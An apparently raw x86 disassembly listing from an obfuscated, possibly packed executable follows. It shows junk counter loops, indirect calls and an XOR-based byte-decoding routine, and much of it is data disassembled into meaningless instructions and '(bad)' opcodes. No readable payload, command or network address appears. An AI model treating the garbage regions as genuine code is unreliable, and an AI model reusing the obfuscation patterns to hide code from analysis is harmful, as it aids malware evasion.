  4038bd:	popf   
  4038be:	shr    bl,cl
  4038c0:	pushf  
  4038c1:	mov    BYTE PTR es:[ebp-0x80],bl
  4038c5:	out    dx,eax
  4038c6:	dec    edx
  4038c7:	or     al,0xd6
  4038c9:	push   cs
  4038ca:	stos   WORD PTR es:[edi],ax
  4038cc:	adc    BYTE PTR [esi+ebp*4],bh
  4038cf:	clc    
  4038d0:	sar    BYTE PTR [ebx],cl
  4038d2:	jmp    DWORD PTR [ecx]
  4038d4:	retf   0xe111
  4038d7:	cmp    BYTE PTR [ecx-0xb],cl
  4038da:	fmul   DWORD PTR [ebp-0x5fe101cd]
  4038e0:	cld    
  4038e1:	mov    cl,BYTE PTR [esi]
  4038e3:	push   eax
  4038e4:	in     eax,dx
  4038e5:	jmp    0xc203:0xc133775e
  4038ec:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  4038f3:	mov    BYTE PTR [edi+esi*1],al
  4038f6:	mov    eax,DWORD PTR [ebp-0x4]
  4038f9:	xor    eax,ecx
  4038fb:	lea    edx,[edx+eax*1+0x32729c]
  403902:	mov    eax,DWORD PTR [ebp-0x4]
  403905:	xor    eax,ecx
  403907:	mov    esi,0xffcd8d64
  40390c:	sub    esi,eax
  40390e:	add    esi,DWORD PTR [ebp+0x10]
  403911:	cmp    edx,esi
  403913:	jbe    0x4029f8
  403919:	pop    ebx
  40391a:	mov    eax,0xf89c8530
  40391f:	pop    edi
  403920:	pop    esi
  403921:	leave  
  403922:	ret    0xc
  403925:	push   ebp
  403926:	mov    ebp,esp
  403928:	sub    esp,0x58
  40392b:	mov    ecx,DWORD PTR [ebp+0x8]
  40392e:	mov    DWORD PTR ds:0x4344ad,0x11
  403938:	cmp    DWORD PTR ds:0x4344ad,0x0
  40393f:	je     0x40397b
  403945:	cmp    DWORD PTR ds:0x4344ad,0x17
  40394c:	jne    0x403960
  403952:	push   0x4343fa
  403957:	push   DWORD PTR [ebp-0x24]
  40395a:	call   DWORD PTR ds:0x432ca6
  403960:	mov    eax,ds:0x4344ad
  403965:	dec    eax
  403966:	mov    ds:0x4344ad,eax
  40396b:	jmp    0x403938
  403970:	mov    eax,ds:0x432e4a
  403975:	add    DWORD PTR ds:0x432e62,eax
  40397b:	mov    eax,0x8a3e
  403980:	xor    ax,WORD PTR [ecx+0x20]
  403984:	mov    ecx,0x3b04
  403989:	adc    DWORD PTR ds:0x432774,0x34fe
  403993:	add    ax,cx
  403996:	movzx  ecx,BYTE PTR ds:0x43449d
  40399d:	sub    DWORD PTR ds:0x434422,ecx
  4039a3:	movzx  eax,ax
  4039a6:	adc    ecx,DWORD PTR ds:0x4344a9
  4039ac:	mov    DWORD PTR [ebp-0xc],eax
  4039af:	and    ecx,0x4bd2
  4039b5:	mov    BYTE PTR [ebp-0x1],0x7f
  4039b9:	xor    ecx,ecx
  4039bb:	or     ecx,DWORD PTR ds:0x434416
  4039c1:	xor    ecx,DWORD PTR ds:0x43441a
  4039c7:	mov    DWORD PTR ds:0x434416,ecx
  4039cd:	lea    eax,[ebp-0x1]
  4039d0:	mov    DWORD PTR ds:0x432e3e,0x10
  4039da:	cmp    DWORD PTR ds:0x432e3e,0x0
  4039e1:	je     0x403a23
  4039e7:	cmp    DWORD PTR ds:0x432e3e,0x1d
  4039ee:	jne    0x403a11
  4039f4:	push   0x43440a
  4039f9:	push   0x4327dd
  4039fe:	push   DWORD PTR [ebp-0xc]
  403a01:	push   0x5939
  403a06:	push   0x4c17
  403a0b:	call   DWORD PTR ds:0x432caa
  403a11:	mov    ecx,DWORD PTR ds:0x432e3e
  403a17:	dec    ecx
  403a18:	mov    DWORD PTR ds:0x432e3e,ecx
  403a1e:	jmp    0x4039da
  403a23:	mov    DWORD PTR [ebp-0x10],eax
  403a26:	mov    al,BYTE PTR [ebp-0x1]
  403a29:	adc    DWORD PTR ds:0x432774,ecx
  403a2f:	mov    ecx,DWORD PTR [ebp-0x10]
  403a32:	xor    al,0x47
  403a34:	sub    al,0x37
  403a36:	and    DWORD PTR ds:0x4343fe,0x4d53
  403a40:	mov    BYTE PTR [ecx],al
  403a42:	mov    DWORD PTR ds:0x432e5e,0x1b
  403a4c:	cmp    DWORD PTR ds:0x432e5e,0x0
  403a53:	je     0x403ab0
  403a59:	cmp    DWORD PTR ds:0x432e5e,0xc
  403a60:	jne    0x403a7c
  403a66:	push   0x432e66
  403a6b:	push   DWORD PTR [ebp-0x28]
  403a6e:	push   0x43441e
  403a73:	push   DWORD PTR [ebp-0x28]
  403a76:	call   DWORD PTR ds:0x432cae
  403a7c:	cmp    DWORD PTR ds:0x432e5e,0xd
  403a83:	jne    0x403a98
  403a89:	xor    ecx,ecx
  403a8b:	xor    ecx,DWORD PTR ds:0x432e5e
  403a91:	dec    ecx
  403a92:	mov    DWORD PTR ds:0x432e5e,ecx
  403a98:	mov    ecx,DWORD PTR ds:0x432e5e
  403a9e:	dec    ecx
  403a9f:	mov    DWORD PTR ds:0x432e5e,ecx
  403aa5:	jmp    0x403a4c
  403aaa:	and    ecx,0x3444
  403ab0:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403ab7:	mov    DWORD PTR [ebp-0x10],0xf89c8530
  403abe:	add    DWORD PTR ds:0x43441a,edi
  403ac4:	mov    eax,DWORD PTR [ebp-0x8]
  403ac7:	or     DWORD PTR ds:0x434416,ecx
  403acd:	mov    ecx,0x7510855
  403ad2:	jmp    0x403c17
  403ad7:	and    eax,0x555995f7
  403adc:	pop    ecx
  403add:	icebp  
  403ade:	jae    0x403a7c
  403ae0:	lods   eax,DWORD PTR ds:[esi]
  403ae1:	imul   ebp,DWORD PTR [ebx],0xffffffb3
  403ae4:	les    eax,FWORD PTR ds:0x701eeccf
  403aea:	jo     0x403b04
  403aec:	jg     0x403b5e
  403aee:	jo     0x403acb
  403af0:	mov    ah,0x46
  403af2:	jbe    0x403acd
  403af4:	je     0x403a87
  403af6:	and    eax,0x136c5155
  403afb:	mov    esp,0xe2ae34cf
  403b00:	mov    ds:0xa3652ec7,eax
  403b05:	imul   esp,DWORD PTR [edx+ebp*1-0x49],0xa
  403b0a:	mov    es,WORD PTR [bp+di+0x79]
  403b0e:	jne    0x403b6b
  403b10:	jnp    0x403ac0
  403b12:	imul   eax,DWORD PTR [eax-0x7be4ba0f],0x5e2a8613
  403b1c:	in     al,0x25
  403b1e:	adc    BYTE PTR [edi+edx*1],al
  403b21:	jmp    0xe64d:0xa40ba2b6
  403b28:	retf   0xbd71
  403b2b:	add    BYTE PTR [ebx+0x6b7bc6e2],ch
  403b31:	leave  
  403b32:	outs   dx,BYTE PTR ds:[esi]
  403b33:	sbb    esp,DWORD PTR [esi-0x34730145]
  403b39:	lahf   
  403b3a:	push   0xffffffbf
  403b3c:	(bad)  
  403b3d:	cdq    
  403b3e:	pop    esi
  403b3f:	push   ds
  403b40:	rol    DWORD PTR [esi+ecx*8],cl
  403b43:	test   bl,bl
  403b45:	pop    ebp
  403b46:	xor    BYTE PTR [edx-0x4ec29f05],ch
  403b4c:	pop    edx
  403b4d:	adc    al,0x32
  403b4f:	test   BYTE PTR [ebx-0x51],dl
  403b52:	push   esp
  403b53:	dec    ebx
  403b54:	inc    ebx
  403b55:	dec    ebx
  403b56:	or     BYTE PTR [ebp+0x7f],al
  403b59:	fxch   st(7)
  403b5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b5c:	and    BYTE PTR [esi],bh
  403b5e:	aaa    
  403b5f:	and    BYTE PTR [ecx],dh
  403b61:	add    ch,BYTE PTR [ecx+edi*8+0x3f]
  403b65:	lds    esi,FWORD PTR [esi-0xbc1e35a]
  403b6b:	xchg   DWORD PTR [ebx],esi
  403b6d:	cs pop ds
  403b6f:	pop    esi
  403b70:	jns    0x403b8a
  403b72:	ds add bh,al
  403b75:	cmp    eax,0x912333e3
  403b7a:	or     cl,BYTE PTR [bp+si-0x67]
  403b7e:	cs out dx,al
  403b80:	fs aaa 
  403b82:	retf   
  403b83:	xchg   BYTE PTR ds:0xa0a5bf9e,cl
  403b89:	add    al,0x34
  403b8b:	pop    ds
  403b8c:	imul   ebp,DWORD PTR [esi+edx*1-0x3a],0x35a69837
  403b94:	stos   BYTE PTR es:[edi],al
  403b95:	in     eax,0x6e
  403b97:	cs push ebp
  403b99:	lods   al,BYTE PTR ds:[esi]
  403b9a:	imul   DWORD PTR [esi-0x3275f4e3]
  403ba0:	cmp    esi,DWORD PTR [ecx+0xb8accb6]
  403ba6:	mov    eax,eax
  403ba8:	sub    al,0x41
  403baa:	into   
  403bab:	xchg   ecx,eax
  403bac:	push   cs
  403bad:	dec    ebx
  403bae:	push   eax
  403baf:	pop    ds
  403bb0:	or     edx,eax
  403bb2:	pop    ecx
  403bb3:	and    cl,BYTE PTR [edi+0x432341c]
  403bb9:	dec    ecx
  403bba:	in     al,0x3d
  403bbc:	jmp    0xb388ab86
  403bc1:	(bad)  
  403bc2:	lods   al,BYTE PTR ds:[esi]
  403bc3:	xor    bh,BYTE PTR [esi+0x5b]
  403bc6:	(bad)  
  403bc7:	mov    ah,0x74
  403bc9:	xor    edx,0xffffffc8
  403bcc:	icebp  
  403bcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bce:	test   BYTE PTR [ebx-0x13],al
  403bd1:	popf   
  403bd2:	sub    edx,0xfffffff4
  403bd5:	pushf  
  403bd6:	mov    al,ds:0x526d9004
  403bdb:	(bad)  
  403bdc:	jns    0x403b61
  403bde:	mov    dl,0xc6
  403be0:	or     ebp,esi
  403be2:	jmp    0x403c60
  403be4:	out    dx,eax
  403be5:	into   
  403be6:	cmp    DWORD PTR [ecx-0x6c],ebx
  403be9:	leave  
  403bea:	(bad)  [ecx-0x3]
  403bed:	adc    esp,DWORD PTR ss:[ebx-0x330b8be8]
  403bf4:	stos   BYTE PTR es:[edi],al
  403bf5:	sub    DWORD PTR [ecx+0x3a0bab02],esp
  403bfb:	jno    0x403be8
  403bfd:	mov    ecx,0xd03dd697
  403c02:	loope  0x403c0b
  403c04:	cdq    
  403c05:	stos   BYTE PTR es:[edi],al
  403c06:	mov    esp,0xbb6fd33e
  403c0b:	push   edi
  403c0c:	fs jo  0x403bf5
  403c0f:	hlt    
  403c10:	jns    0x403c04
  403c12:	stos   DWORD PTR es:[edi],eax
  403c13:	into   
  403c14:	in     eax,dx
  403c15:	xchg   edx,eax
  403c16:	(bad)  
  403c17:	push   esi
  403c18:	inc    esi
  403c19:	xor    eax,ecx
  403c1b:	mov    esi,0x32729c
  403c20:	sbb    DWORD PTR ds:0x4343f6,0x4344a1
  403c2a:	add    eax,esi
  403c2c:	mov    DWORD PTR ds:0x432e56,0x19db
  403c36:	jmp    0x403c4d
  403c3b:	mov    DWORD PTR ds:0x4343ea,0x1bda
  403c45:	mov    dl,BYTE PTR [ebp-0x1]
  403c48:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403c4c:	inc    eax
  403c4d:	cmp    eax,0x40
  403c50:	jmp    0x403d95
  403c55:	sbb    bl,BYTE PTR [ebx+eiz*1+0x1981a102]
  403c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c5d:	scas   al,BYTE PTR es:[edi]
  403c5e:	xchg   ecx,eax
  403c5f:	sub    al,0x28
  403c61:	ins    BYTE PTR es:[edi],dx
  403c62:	arpl   WORD PTR [eax],di
  403c64:	nop
  403c65:	xchg   esp,eax
  403c66:	sbb    eax,0x7f187070
  403c6b:	jo     0x403cdd
  403c6d:	ss inc ecx
  403c6f:	xor    esp,esi
  403c71:	xacquire xchg BYTE PTR [edi+eiz*1],ah
  403c75:	sub    edx,edx
  403c77:	and    BYTE PTR [ecx-0x72],dl
  403c7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c7b:	data16 cli 
  403c7d:	pusha  
  403c7e:	mov    ebx,0x966d31e4
  403c83:	dec    esp
  403c84:	icebp  
  403c85:	xchg   ebp,eax
  403c86:	jnp    0x403c72
  403c88:	xchg   edi,eax
  403c89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c8a:	xor    DWORD PTR [esi+0x7f],edx
  403c8d:	dec    ebx
  403c8e:	mov    cl,BYTE PTR [edi]
  403c90:	mov    dh,0x8d
  403c92:	sub    al,0xdf
  403c94:	or     al,0x24
  403c97:	sbb    BYTE PTR [esi+ecx*8+0x50],dh
  403c9b:	fistp  QWORD PTR [ebx+0x17]
  403c9e:	xor    esp,DWORD PTR [ebp-0x28a664db]
  403ca4:	(bad)  
  403ca6:	dec    edi
  403ca7:	add    eax,0x109dff38
  403cac:	cmp    ebx,DWORD PTR [ebx-0x52]
  403caf:	addr16 es in eax,0x27
  403cb3:	pop    ds
  403cb4:	add    esp,eax
  403cb6:	je     0x403c45
  403cb8:	jl     0x403cc1
  403cba:	pop    esp
  403cbb:	aam    0x4b
  403cbd:	sbb    al,0x12
  403cbf:	popf   
  403cc0:	or     eax,0xf2bf8e02
  403cc5:	inc    esi
  403cc6:	or     esi,edi
  403cc8:	add    al,0x95
  403cca:	jns    0x403d0f
  403ccc:	pushf  
  403ccd:	cdq    
  403cce:	or     ebx,DWORD PTR [ecx+0x67]
  403cd1:	outs   dx,DWORD PTR ds:[esi]
  403cd2:	sbb    al,0x87
  403cd5:	sti    
  403cd6:	loopne 0x403c59
  403cd8:	fimul  WORD PTR [ebx]
  403cda:	or     al,BYTE PTR [ecx+0x2]
  403cdd:	dec    esi
  403cde:	sub    ah,BYTE PTR [eax+0x49]
  403ce1:	inc    ebx
  403ce2:	dec    ebx
  403ce3:	and    bl,BYTE PTR [edi+0x7e2d3e23]
  403ce9:	shl    DWORD PTR [esi],1
  403ceb:	popa   
  403cec:	sub    DWORD PTR [ebp-0x79b2c74],ebp
  403cf2:	test   eax,esp
  403cf4:	fisttp QWORD PTR [esi+0x491bd55d]
  403cfa:	in     al,dx
  403cfb:	(bad)  
  403cfd:	mov    dh,0xd1
  403cff:	sbb    eax,0x136da6ca
  403d04:	shr    edx,cl
  403d06:	(bad)  
  403d07:	in     al,0x1c
  403d09:	adc    eax,0x72569419
  403d0e:	pop    es
  403d0f:	pop    es
  403d10:	addr16 (bad) 
  403d12:	push   ebx
  403d13:	nop
  403d14:	lods   eax,DWORD PTR ds:[esi]
  403d15:	aam    0x9d
  403d17:	adc    esi,ecx
  403d19:	les    ebp,FWORD PTR [ebx-0x39bcb13d]
  403d1f:	in     eax,dx
  403d20:	aam    0xdb
  403d22:	pop    edi
  403d23:	in     al,0x8f
  403d25:	imul   esi,DWORD PTR [edx+0x52],0xffffffae
  403d29:	mov    ds:0x4be701a6,eax
  403d2e:	test   eax,0x2c940be
  403d33:	inc    esp
  403d34:	icebp  
  403d35:	push   0x9eb9e5d7
  403d3a:	fistp  DWORD PTR [esi]
  403d3c:	pop    esp
  403d3d:	mov    edi,0x97fd1045
  403d42:	and    eax,0xca86c516
  403d47:	(bad)  
  403d48:	faddp  st(7),st
  403d4a:	jo     0x403d90
  403d4c:	push   0x16765576
  403d51:	sbb    BYTE PTR [esi+0x37],dl
  403d54:	int3   
  403d55:	dec    esi
  403d56:	mov    DWORD PTR [edi+0x6f],ebp
  403d59:	jnp    0x403d6a
  403d5b:	(bad)  
  403d5c:	loopne 0x403dd1
  403d5e:	xchg   esp,eax
  403d5f:	leave  
  403d60:	dec    edi
  403d61:	adc    DWORD PTR [edx+0x733213e4],esp
  403d67:	xchg   edi,eax
  403d68:	shl    BYTE PTR [eax-0x2c],1
  403d6b:	popa   
  403d6c:	push   ebx
  403d6d:	xor    DWORD PTR [ecx+0x64522ac5],edx
  403d73:	ds xor esp,ebp
  403d76:	xchg   edx,eax
  403d77:	xor    eax,0x30be25e3
  403d7c:	jg     0x403d5d
  403d7e:	dec    esp
  403d7f:	pop    eax
  403d80:	jo     0x403e01
  403d82:	jno    0x403d9f
  403d84:	repz sbb DWORD PTR [ebx-0x3f],0x8350a278
  403d8c:	pop    edi
  403d8d:	mov    cl,0x30
  403d8f:	dec    esp
  403d90:	ins    DWORD PTR es:[edi],dx
  403d91:	shl    bl,cl
  403d93:	stos   BYTE PTR es:[edi],al
  403d94:	mov    esp,0xfea0820f
  403d99:	(bad)  
  403d9a:	dec    DWORD PTR [ebx+0x2581f855]
  403da0:	sbb    al,BYTE PTR [ebx+eax*2+0x0]
  403da4:	add    BYTE PTR [eax],al
  403da6:	add    BYTE PTR [eax],al
  403da8:	jmp    0x403dbb
  403dad:	xor    eax,eax
  403daf:	add    eax,DWORD PTR ds:0x43441a
  403db5:	inc    eax
  403db6:	mov    ds:0x43441a,eax
  403dbb:	cmp    DWORD PTR ds:0x43441a,0x13
  403dc2:	jae    0x403dfe
  403dc8:	cmp    DWORD PTR ds:0x43441a,0xc
  403dcf:	jne    0x403dde
  403dd5:	push   DWORD PTR [ebp-0x1c]
  403dd8:	call   DWORD PTR ds:0x432a3e
  403dde:	cmp    DWORD PTR ds:0x43441a,0xb
  403de5:	jne    0x403df9
  403deb:	xor    eax,eax
  403ded:	add    eax,DWORD PTR ds:0x43441a
  403df3:	inc    eax
  403df4:	mov    ds:0x43441a,eax
  403df9:	jmp    0x403dad
  403dfe:	mov    eax,DWORD PTR [ebp-0xc]
  403e01:	xor    edx,ecx
  403e03:	add    edx,esi
  403e05:	cmp    edx,eax
  403e07:	jmp    0x403f4c
  403e0c:	inc    ecx
  403e0d:	sub    al,0xb8
  403e0f:	xor    BYTE PTR [ebp+0x72],0x41
  403e13:	jmp    0x403d9a
  403e15:	inc    ebp
  403e16:	mov    al,0x72
  403e18:	add    eax,0xbc0b1de9
  403e1d:	sbb    al,0x70
  403e1f:	jo     0x403e39
  403e21:	jg     0x403e93
  403e23:	jo     0x403db8
  403e25:	mov    cl,0xc5
  403e27:	mov    ch,0xc
  403e29:	and    ah,al
  403e2b:	mov    eax,0x2e2fad87
  403e30:	mov    ch,0xf9
  403e32:	into   
  403e33:	sub    al,0x59
  403e35:	ins    DWORD PTR es:[edi],dx
  403e36:	imul   esp,DWORD PTR [eax-0x3d],0x2e76a9d9
  403e3d:	les    esi,FWORD PTR [eax+ebp*2+0x321a0389]
  403e44:	cmp    eax,DWORD PTR [edx]
  403e46:	pusha  
  403e47:	out    dx,al
  403e48:	push   0x9e810ab9
  403e4d:	popf   
  403e4e:	cwde   
  403e4f:	cld    
  403e50:	cli    
  403e51:	popf   
  403e52:	sahf   
  403e53:	xor    edi,eax
  403e55:	loop   0x403e47
  403e57:	loope  0x403e17
  403e59:	xchg   ebx,eax
  403e5a:	fisubr DWORD PTR ds:0x334f5c66
  403e60:	out    dx,al
  403e61:	ret    0xa3a2
  403e64:	and    cl,BYTE PTR [ebp-0x2e]
  403e67:	xor    eax,0x3365aaf7
  403e6c:	cmp    ebp,0x19
  403e6f:	xor    ebx,DWORD PTR [edx]
  403e71:	pop    esp
  403e72:	ins    BYTE PTR es:[edi],dx
  403e73:	push   ss
  403e74:	(bad)
  403e77:	jae    0x403e39
  403e79:	push   esi
  403e7a:	lea    ecx,[ebx]
  403e7c:	push   0x68b1d290
  403e81:	mov    dl,0xa0
  403e83:	(bad)  
  403e84:	loopne 0x403e7b
  403e86:	mov    ch,0x2c
  403e88:	test   al,0x6a
  403e8a:	inc    esp
  403e8b:	(bad)  
  403e8c:	(bad)  
  403e8d:	adc    dh,BYTE PTR [edx+ebx*1-0x73873daf]
  403e94:	xor    edx,DWORD PTR [edx+0x4c]
  403e97:	inc    ebp
  403e98:	xchg   edi,eax
  403e99:	fldenv [eax+0x11af8bee]
  403e9f:	sti    
  403ea0:	mov    dl,0x78
  403ea2:	xlat   BYTE PTR ds:[ebx]
  403ea3:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  403ea5:	aas    
  403ea6:	mov    bh,0xde
  403ea8:	xchg   esi,eax
  403ea9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403eaa:	retf   0xf3e6
  403ead:	or     eax,0x439ab498
  403eb2:	inc    edx
  403eb3:	rcl    DWORD PTR [ebx-0x7e],1
  403eb6:	mov    dl,0xc8
  403eb8:	mov    WORD PTR [edi],cs
  403eba:	sbb    eax,0x42953f80
  403ebf:	push   cs
  403ec0:	bound  eax,QWORD PTR [edx+0x5bf21de6]
  403ec6:	call   0xc301adcc
  403ecb:	add    DWORD PTR [ebx],edi
  403ecd:	out    0xc3,eax
  403ecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ed0:	stos   DWORD PTR es:[edi],eax
  403ed1:	cs rol dl,1
  403ed4:	pop    edi
  403ed5:	or     esi,DWORD PTR [ecx]
  403ed7:	ins    BYTE PTR es:[edi],dx
  403ed8:	mov    ebp,0x83321050
  403edd:	ror    ecx,0x8d
  403ee0:	inc    edx
  403ee1:	call   0x570:0xadc755e0
  403ee8:	mov    edx,0x3b021fda
  403eed:	jnp    0x403f5b
  403eef:	jo     0x403eeb
  403ef1:	pop    ecx
  403ef2:	sub    al,dl
  403ef4:	(bad)
  403ef9:	push   DWORD PTR [ecx-0x2a]
  403efc:	pop    ebx
  403efd:	pop    edi
  403efe:	mov    eax,ds:0xa25a3974
  403f03:	je     0x403f0f
  403f05:	(bad)  
  403f06:	push   ebx
  403f07:	xchg   DWORD PTR fs:[ecx],edi
  403f0a:	xor    dl,bh
  403f0c:	fs aad 0x69
  403f0f:	mov    eax,ds:0xcb768846
  403f14:	daa    
  403f15:	xchg   BYTE PTR [edi],dl
  403f17:	sbb    BYTE PTR [edx+0x73ea53d4],bh
  403f1d:	mov    edx,0x5e7156d6
  403f22:	ficom  DWORD PTR [esi]
  403f24:	adc    eax,0xe64cf5ed
  403f29:	dec    eax
  403f2a:	jns    0x403ef7
  403f2c:	aad    0x3c
  403f2e:	dec    esp
  403f2f:	sub    eax,0x6db14ee4
  403f34:	xor    esi,DWORD PTR [ebp+0x74]
  403f37:	fdivr  DWORD PTR [ecx+0x54]
  403f3a:	and    al,0x34
  403f3c:	xchg   esp,eax
  403f3d:	test   DWORD PTR [ebp+0x3de91166],0x72095629
  403f47:	and    al,0x4f
  403f49:	xchg   esi,eax
  403f4a:	xor    BYTE PTR [ebx],bl
  403f4c:	je     0x4040d7
  403f52:	push   ebx
  403f53:	push   edi
  403f54:	mov    edi,DWORD PTR [ebp+0x8]
  403f57:	mov    eax,0x8a3e
  403f5c:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403f61:	mov    edi,0x3b04
  403f66:	add    ax,di
  403f69:	movzx  eax,ax
  403f6c:	mov    DWORD PTR [ebp-0x14],eax
  403f6f:	mov    eax,DWORD PTR [ebp+0x8]
  403f72:	movzx  eax,WORD PTR [eax+edx*4]
  403f76:	xor    eax,0x8a3e
  403f7b:	add    eax,edi
  403f7d:	mov    edi,DWORD PTR [ebp-0x14]
  403f80:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403f84:	mov    eax,DWORD PTR [ebp-0xc]
  403f87:	inc    edx
  403f88:	cmp    edx,eax
  403f8a:	jne    0x403f54
  403f90:	pop    edi
  403f91:	jmp    0x4040d6
  403f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f97:	fisubr DWORD PTR [edi-0x598e8c4b]
  403f9d:	jmp    0x4923f392
  403fa2:	repnz push 0x1b643f9c
  403fa8:	jo     0x40401a
  403faa:	sbb    BYTE PTR [edi+0x70],bh
  403fad:	jo     0x403fe1
  403faf:	(bad)  
  403fb0:	das    
  403fb1:	xchg   ecx,eax
  403fb2:	sbb    esi,DWORD PTR [ebx-0x32]
  403fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fb6:	or     ecx,esi
  403fb8:	fs sub eax,esp
  403fbb:	cli    
  403fbc:	into   
  403fbd:	sbb    BYTE PTR [ecx-0x1a],dl
  403fc0:	pop    ecx
  403fc1:	mov    ah,0xed
  403fc3:	test   al,0x2d
  403fc5:	jnp    0x403ff9
  403fc7:	cmp    ah,BYTE PTR [eax]
  403fc9:	sbb    edi,DWORD PTR [esi]
  403fcb:	lods   al,BYTE PTR ds:[esi]
  403fcc:	pop    edi
  403fcd:	popa   
  403fce:	repz jbe 0x403f68
  403fd1:	sbb    al,0x1
  403fd3:	mov    al,ds:0x71a719db
  403fd8:	and    DWORD PTR [edi-0x48c5d55f],esi
  403fde:	cwde   
  403fdf:	or     al,0x9f
  403fe1:	xor    al,0xa4
  403fe3:	les    edx,FWORD PTR [eax-0x462daaac]
  403fe9:	and    cl,BYTE PTR [ebx+0x77]
  403fec:	cmp    DWORD PTR ds:0x3142f5ac,edi
  403ff2:	add    dh,dl
  403ff4:	sub    al,0x70
  403ff6:	mov    eax,0x5913484c
  403ffb:	ror    cl,1
  403ffd:	fist   WORD PTR [edi+ebx*1-0x43716a9b]
  404004:	sbb    eax,0x2144d7fb
  404009:	mov    ch,0x94
  40400b:	leave  
  40400c:	or     al,0x3b
  40400e:	mov    esi,0x11e7a78d
  404013:	popa   
  404014:	mul    BYTE PTR [eax]
  404016:	mov    ebp,0xa347225b
  40401b:	xchg   DWORD PTR [esi],ecx
  40401d:	cmp    BYTE PTR [esp+esi*2-0x24454ccf],cl
  404024:	and    eax,0x125631bb
  404029:	sbb    eax,0x2fb566aa
  40402e:	imul   esp,DWORD PTR [ecx-0x3821f3c3],0x3c
  404035:	push   esi
  404036:	cs int3 
  404038:	mov    esi,0x65eb95b0
  40403d:	js     0x403fca
  40403f:	cmp    DWORD PTR [ecx+ebx*4+0x52d874b3],ecx
  404046:	jg     0x403fde
  404048:	mov    ecx,0x5e94088b
  40404d:	in     al,dx
  40404e:	mov    ebp,0x453a3a1c
  404053:	jns    0x404073
  404055:	mov    ebp,0x64da509c
  40405a:	jno    0x40407a
  40405c:	inc    ebx
  40405d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40405e:	jno    0x40407c
  404060:	cmp    DWORD PTR [ecx-0x32],ecx
  404063:	into   
  404064:	popa   
  404065:	xor    ch,BYTE PTR [edi]
  404067:	lea    edi,[eax]
  404069:	mov    cl,0x30
  40406b:	dec    edi
  40406c:	arpl   bx,si
  40406e:	mov    bl,0x3
  404070:	test   eax,0x96fbb6a4
  404075:	loopne 0x4040ce
  404077:	mov    BYTE PTR [edi+0x4e],bl
  40407a:	rcr    DWORD PTR [edi+0x45a74bfa],cl
  404080:	shr    DWORD PTR [edi+eax*1-0x7de40316],cl
  404087:	pushw  0xffe9
  40408a:	outs   dx,BYTE PTR ds:[esi]
  40408b:	es call 0xbd6d5b52
  404091:	jo     0x4040bd
  404093:	aad    0x8a
  404095:	dec    edx
  404096:	push   cs
  404097:	mov    bh,0x3e
  404099:	retf   
  40409a:	pop    esi
  40409b:	repz out dx,eax
  40409d:	cld    
  40409e:	fild   DWORD PTR [edx]
  4040a0:	xor    dl,BYTE PTR [edi]
  4040a2:	ja     0x40409a
  4040a4:	push   edi
  4040a5:	in     eax,dx
  4040a6:	mov    bh,0x89
  4040a8:	and    al,0xfb
  4040aa:	dec    ebx
  4040ab:	shr    ebp,cl
  4040ad:	mov    al,ds:0x1f07540b
  4040b2:	clc    
  4040b3:	adc    ebx,DWORD PTR [ebx-0x20ea3dc6]
  4040b9:	ror    DWORD PTR [esi-0x1d],cl
  4040bc:	rcr    BYTE PTR [edx],0xb4
  4040bf:	push   esp
  4040c0:	ins    DWORD PTR es:[edi],dx
  4040c1:	popa   
  4040c2:	mov    dh,0x31
  4040c4:	shr    dl,cl
  4040c6:	(bad)  
  4040c7:	iret   
  4040c8:	aaa    
  4040c9:	fmul   DWORD PTR [edx]
  4040cb:	iret   
  4040cc:	not    DWORD PTR [esi-0x42a47f9e]
  4040d2:	pop    es
  4040d3:	mov    ecx,DWORD PTR [edx+0x1b]
  4040d6:	pop    ebx
  4040d7:	mov    eax,DWORD PTR [ebp-0x8]
  4040da:	mov    edx,DWORD PTR [ebp+0x10]
  4040dd:	jmp    0x404222
  4040e2:	aaa    
  4040e3:	ins    DWORD PTR es:[edi],dx
  4040e4:	pop    ss
  4040e5:	int3   
  4040e6:	push   ebp
  4040e7:	jb     0x4040dc
  4040e9:	jno    0x404096
  4040eb:	pop    ebx
  4040ec:	imul   edi,DWORD PTR [edx-0x30b08dbb],0xc
  4040f3:	sbb    DWORD PTR [eax+0x70],esi
  4040f6:	sbb    BYTE PTR [edi+0x70],bh
  4040f9:	jo     0x404135
  4040fb:	and    DWORD PTR [eax+0x5a],0xffffffae
  4040ff:	mov    dl,0xa4
  404101:	inc    edi
  404102:	push   ebp
  404103:	sbb    ecx,ebx
  404105:	ret    
  404106:	mov    ebp,0x95fc32bb
  40410b:	push   ds
  40410c:	push   ecx
  40410d:	xchg   DWORD PTR ds:0x9b15a5a,edi
  404113:	and    eax,0x92c05652
  404118:	cmp    edi,ebp
  40411a:	mov    ch,0xf8
  40411c:	add    DWORD PTR [ecx-0x40],edx
  40411f:	jp     0x404184
  404121:	mov    bx,0xdc50
  404125:	pop    ds
  404126:	test   DWORD PTR [ebx+esi*1-0x554d14ff],ecx
  40412d:	dec    esi
  40412e:	pop    ebx
  40412f:	stc    
  404130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404131:	dec    edi
  404132:	dec    edi
  404133:	mov    cl,0x4
  404135:	push   edx
  404136:	in     eax,dx
  404137:	pop    ecx
  404138:	inc    ebp
  404139:	ins    DWORD PTR es:[edi],dx
  40413a:	push   esp
  40413b:	fadd   DWORD PTR [edi-0x3b]
  40413e:	lods   eax,DWORD PTR ds:[esi]
  40413f:	dec    edx
  404140:	xor    bh,BYTE PTR [esi+0x50]
  404143:	stos   BYTE PTR es:[edi],al
  404144:	mov    esp,0x312d96f1
  404149:	test   edi,edi
  40414b:	push   esi
  40414c:	add    bh,BYTE PTR [ebx+eax*1+0x3d58b54f]
